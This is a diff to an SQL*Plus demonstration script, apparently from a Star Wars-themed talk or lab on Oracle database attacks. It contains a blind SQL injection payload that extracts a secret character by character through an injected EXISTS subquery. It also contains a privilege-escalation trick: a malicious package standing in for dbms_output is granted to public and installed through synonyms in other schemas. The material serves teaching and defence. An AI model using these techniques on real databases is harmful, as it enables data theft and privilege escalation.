@@ -4,20 +4,8 @@ set trimout on
 column name format a30
 column code format a60
 #pause
+update deathstar_rooms....
 set echo on
-
-select * from deathstar_rooms;
-#pause
-
--- Inject with APEX
-#pause
-
-select * from deathstar_rooms;
-#pause
-
-#pause/**/
-
-
 
 select room_info.get_room_id(''') and exists(select 1 from imperial_secrets where id = 1 and lower(substr(secret, 1, 1)) = ''a'') --') result from dual;
 #pause
@@ -168,16 +156,14 @@ end;
 
 grant execute on malicious_dbms_output to public;
 #pause
-select * from user_role_privs;
+select username, granted_role from user_role_privs;
 #pause/**/
-
-select * from user_role_privs;
-#pause
 
 create synonym deathstar.dbms_output for malicious_dbms_output;
 create synonym darth_dba.dbms_output for malicious_dbms_output;
 #pause
 
+set serveroutput on
 select deathstar.room_info.get_room_id('Vader') from dual;
 #pause
 
@@ -191,4 +177,4 @@ select deathstar.room_info.get_room_id('Vader') from dual;
 #pause/**/
 
 
-select * from user_role_privs;
+select username, granted_role from user_role_privs;
